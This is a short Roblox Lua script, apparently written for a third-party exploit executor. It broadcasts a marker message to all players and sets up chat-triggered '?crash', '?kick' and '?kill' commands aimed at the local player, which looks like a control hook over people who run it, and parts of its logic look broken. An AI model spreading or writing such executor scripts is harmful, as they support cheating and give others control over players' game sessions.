local lplr = game.Players.LocalPlayer
 args = {
                [1] = "nightbed",
                [2] = "All"
          }
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))

lplr.Chatted:connect(function(chat)
    if chat:match("?crash "..lplr.Name) then
        setfpscap(0)
    elseif chat:match("?kick "..lplr.Name) then
         lplr:kick(args)
    elseif chat:match("?kill "..lplr.Name) then
        lplr.Character.Humanoid:TakeDamage(lplr.Character.Humanoid.Health)
    end
end)
